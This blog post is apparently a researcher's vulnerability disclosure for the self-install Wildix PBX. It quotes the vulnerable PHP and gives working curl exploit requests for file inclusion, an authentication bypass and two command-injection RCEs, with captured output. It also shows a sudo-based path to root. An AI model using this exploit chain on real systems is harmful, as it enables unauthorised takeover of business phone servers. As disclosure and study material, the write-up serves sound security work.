---
layout: post
title: wildix vulnerabilities
---


According to www.wildix.com

*Wildix VoIP PBX is a reliable communication system for small or large business, it is scalable, flexible and it easily adapts to the needs of any company.*

wildix pbx is a pbx system offered by wildix that is built using php, i was able to find a couple of vulnerabilities . but i soon learned that the vulnerabilities only exist in the self install version, both their virtual and physical appliances seem to not contain these vulnerabilities , i was unable to find any cve's associated with these vulnerabilities

first vulnerability was a very simple one , was quite surprising to see

### Arbitrary file inclusion
This bug exists in the index.php file. A user supplied file name is included with no checks or validations.

```php
require_once "auth.php";
/*

REDACTED
*/
if (!empty($_GET["class"])) {
    ini_set("include_path", BASEPATH . "classes/PEAR/" . ":" . ini_get("include_path"));
    ini_set("include_path", BASEPATH . ":" . ini_get("include_path"));
    require "lang/" . (isset($_SESSION["language"]) ? $_SESSION["language"] : "english") . ".inc.php";
    require_once $_GET["class"];
    exit("Cannot redirect to class file");
}

```
The path that is set to get param `class` is included without validation. this can be used to include any php file in the system to execute and any non-php file to read .
But `auth.php` file is included. And that file will exit if the proper creds aren't supplied. thats okay thou as there exits an auth bypass bug on it 
### Auth bypass
```php
require_once dirname(__FILE__) . "/init.php";
if (strtolower($_SERVER["HTTP_X_REQUESTED_WITH"]) == "xmlhttprequest") {
    if (!isset($_SERVER["REMOTE_USER"])) {
        exit("Cannot authorize the user");
    }
} else {
    if (!User::getInstance()->isLogged()) {
        header("Location: logout/?" . $_SERVER["REQUEST_URI"]);
        exit("Cannot authorize the user");
    }
}
if ((!isset($_SESSION["language"]) || !isset($_SESSION["username"])) && !isset($_GET["mac"])) {
    header("location: ./");
}
//REDACTED
```
If header `X-Requested-With` is set to `xmlhttprequest` and the value of `$_SERVER["REMOTE_USER"]` is set to any value. authentication does not occur . and down the line if `$_SESSION["username"]` is not set the script will redirect using `header()` . but the `header` function only sets response headers and does not exit . therefore the script will continue to execute, 

**exploitation :** send a request with header `X-Requested-With` set to `xmlhttprequest`,header `Authorization` set to `Basic YWRtaW46YWRtaW5h` (Basic and base64 of username and password contatinated together with a colon `:` in between. This is to in order to set variable `$_SERVER["REMOTE_USER"]` using HTTP BASIC AUTHORIZATION ). And finally get param `class` set to the path of the file to be included 

```console
$ curl 'http://192.168.0.19/index.php?class=/etc/passwd' -H 'X-Requested-With: xmlhttprequest' -H 'Authorization: Basic YWRtaW46YWRtaW5h' 
 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
sshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin
wms:x:1000:1000:,,,:/var/www:/bin/bash
callweaver:x:1001:1001:,,,:/var/www:/bin/false
admin:x:1002:1003:Administrator,,,:/home/admin:/bin/bash
openldap:x:1003:1004::/home/openldap:/bin/sh
ejabberd:x:1004:1005::/dev/shm/wmsdb.d/ejabberd:/bin/sh
fetchmail:x:103:65534::/var/lib/fetchmail:/bin/false
snmp:x:105:65534::/var/lib/snmp:/bin/false
dnsmasq:x:102:65534:dnsmasq,,,:/var/lib/misc:/bin/false
ntp:x:104:104::/home/ntp:/bin/false
nagios:x:106:106::/var/log/nagios:/bin/false
shellinabox:x:107:107:Shell In A Box,,,:/var/lib/shellinabox:/bin/false
freerad:x:108:108::/etc/freeradius:/bin/false
statd:x:109:65534::/var/lib/nfs:/bin/false
Cannot redirect to class file%
```
### RCE (using auth bypass)
the endpoint `features/make_keys_pdf.php` uses a user supplied value in a command without any sanitization
```php
require_once "../init.php";
if (preg_match("/(cticonnect)|(collaboration)/", $_SERVER["REQUEST_URI"])) {
    //REDACTED
} else {
    include_once file_exists("auth.php") ? "auth.php" : "../auth.php";
}
require_once "functions.php";
if (isset($_GET["set"])) {
/*
...
REDACTED
...
*/
	$file = exec("lua /var/www/lua/make_keys_pdf.lua " . json_encode($_GET["set"]) . " " . json_encode(json_encode($arr_fkeys)));
    if (file_exists($file)) {
        readfile($file);
        unlink($file);
    }
}


```
since `auth.php` is included , the auth bypass is needed here. other than that it is a straight forward command execution

**exploitation :** send a request to endpoint `features/make_keys_pdf.php` with headers mentioned in the auth bypass above set accordingly and with get param `set` set to command to be executed inside backticks
```console
$ curl 'http://192.168.0.19/features/make_keys_pdf.php?set=`id>PWNED`' -H 'X-Requested-With: xmlhttprequest' -H 'Authorization: Basic YWRtaW46YWRtaW5h' 

$ curl 'http://192.168.0.19/features/PWNED'
uid=1000(wms) gid=1000(wms) groups=42(shadow),1000(wms),1005(ejabberd)

```

### RCE
This one is very straight forward . a user supplied value is directly concatenated in to a command and executed. And since `auth.php` is not included there is no need for auth bypass. The vulnerable endpoint is  `/devices/device_verify.php`
```php
if (isset($_GET["action"]) && isset($_GET["ip"])) {
    $nmap_opts = "-sS";
    if (isset($_GET["rawScan"])) {
        $nmap_opts = "--unprivileged -sT";
    }
    $content = exec("nice -n 20 nohup sudo nmap --script /var/www/lua/discovery.nse " . $nmap_opts . " -n --max-retries 2 --max-hostgroup 1 --max-rtt-timeout 1750ms --initial-rtt-timeout 1250ms --open -p 80,443 -oG - " . $_GET["ip"] . " 2>&1 >/dev/null");
    echo "{" . $content . "}";
}

?>
```

**exploitation :** send a request to endpoint  `/devices/device_verify.php` with get param `action` set to any value and get param `ip` set to a the command to be executed inside backticks

```console

$ curl 'http://192.168.0.19/devices/device_verify.php?action=xx&ip=`id>/tmp/PWNED`'

```

#### privilege escalation

The webserver is running via user wms. so to gain root privilages some extra work is needed 
looking at the `/etc/sudoers` file 

```
root    ALL=(ALL) ALL

# Uncomment to allow members of group sudo to not need a password
# (Note that later entries override this, so you might need to move
# it further down)
# %sudo ALL=NOPASSWD: ALL

Defaults        lecture=never,!syslog

Cmnd_Alias WMS_PBX=/usr/sbin/check_io_usb.sh, /usr/bin/mutt, /etc/init.d/lighttpd, /usr/sbin/monit, /etc/init.d/fastcgi, /usr/sbin/dhcpd, /etc/dhcp.conf, /var/lib/dhcpd, /etc/init.d/ntpdate, /etc/monit/gendnsmonit, /bin/echo, /usr/bin/monit, /usr/sbin/wms_remote_support, /usr/sbin/wms_auth_sync, /usr/sbin/fix-dpkg.sh, /sbin/ifup, /sbin/ifdown, /etc/init.d/dnsmasq, /sbin/ifconfig, /sbin/route, /bin/date, /etc/cron.d, /usr/sbin/ntpdate-debian, /etc/init.d/ifplugd, /usr/sbin/ifplugd, /etc/default/ntpdate, /etc/init.d/ntp, /etc/init.d/sshd, /etc/init.d/ssh, /etc/init.d/callweaver, /usr/sbin/update-rc.d, /usr/bin/sox, /usr/sbin/callweaver, /bin/hostname, /usr/sbin/wmsreset, /usr/sbin/wms_backup_create, /usr/sbin/wms_applybackup, /bin/cat, /etc/init.d/networking, /bin/mount, /bin/umount, /sbin/start-stop-daemon, /usr/bin/apt-get, /sbin/reboot, /usr/sbin/wms_upgrade, /bin/df, /bin/chmod, /bin/chown, /sbin/blkid, /sbin/mii-tool, /etc/init.d/monit, /etc/init.d/snmpd, /sbin/mkfs.ext2, /sbin/mkfs.ext3, /usr/bin/munpack, /etc/init.d/inetd, /usr/bin/resident, /sbin/iptables, /usr/bin/pkill, /bin/kill, /usr/sbin/tcpdump, /usr/bin/rsync, /usr/bin/ssh-keygen, /usr/bin/jail-apt, /usr/bin/custom-apt, /sbin/halt, /usr/sbin/dnsmasq, /etc/init.d/dnsmasq, /usr/sbin/wms_gs_encoder, /etc/init.d/slapd, /etc/init.d/wildix-con_server, /etc/init.d/wildix-con_client, /etc/init.d/vtun, /etc/init.d/openvpn, /bin/ping, /usr/sbin/dmidecode, /bin/ln, /bin/cp, /bin/rm, /bin/mkdir, /usr/sbin/usermod, /usr/bin/nmap, /usr/sbin/kamctl, /usr/sbin/wmsbind, /usr/sbin/ldap_reset, /etc/init.d/kamailio, /usr/sbin/restart_kamailio_with_delay, /sbin/sysctl, /usr/sbin/brctl, /sbin/vconfig, /usr/sbin/wshaper, /usr/sbin/ucarp, /bin/sync, /usr/sbin/gsm-rebooter, /etc/init.d/sms, /etc/init.d/transmitfax, /usr/sbin/syslog_grep, /usr/sbin/lighty-enable-mod, /usr/sbin/lighty-disable-mod, /usr/sbin/init_usb, /sbin/udevadm, /sbin/sfdisk, /etc/init.d/ejabberd, /usr/sbin/remount_fs,/var/www/upgrade/upgrade_stage2.php, /etc/init.d/radicale, /usr/bin/lua, /etc/init.d/freeradius, /etc/init.d/tproxyd, /bin/netstat, /etc/init.d/whoteld, /etc/init.d/rtpengine, /usr/bin/touch, /usr/bin/awk, /bin/sed, /etc/init.d/wudpecho, /etc/network/if-up.d/hosts, /usr/sbin/update_kamailio_cfg.sh, /usr/sbin/ejabberdctl, /usr/sbin/smartctl

User_Alias WMS_PBX=wms,admin,ejabberd

WMS_PBX ALL=(ALL) NOPASSWD: WMS_PBX

nagios ALL=(ALL) NOPASSWD: ALL


```
The user wms is allowd to user sudo without password to execute some executable files. some of there are intresting. The file `/var/www/upgrade/upgrade_stage2.php` is one of those files , and the permitions on this file are 

```console
root@wildix_server:/# ls -alh /var/www/upgrade/upgrade_stage2.php
-rwxr-xr-x 1 wms wms 42 2021-01-10 17:40 /var/www/upgrade/upgrade_stage2.php

```

we can write into the file and then execute it with sudo to gian root privilages
